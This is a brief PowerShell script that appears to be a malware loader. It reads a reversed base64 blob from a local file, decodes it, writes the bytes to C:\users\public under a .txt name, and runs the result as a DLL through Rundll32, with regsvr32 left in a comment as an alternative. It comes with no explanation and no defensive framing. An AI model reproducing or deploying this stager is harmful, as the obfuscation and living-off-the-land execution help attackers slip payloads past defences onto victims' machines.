$b64 = Get-Content -Path 'peseta\data.txt';
$b64[-1..-($b64.Length)] -join '';
$r = $b64.ToCharArray();
[array]::Reverse($r);
-join($r);

$filename = 'C:\users\public\test1.txt';
$bytes = [Convert]::FromBase64String($r);
[IO.File]::WriteAllBytes($filename, $bytes);

# start-process regsvr32 $filename;
start-process Rundll32 $filename,DrawThemeIcon;


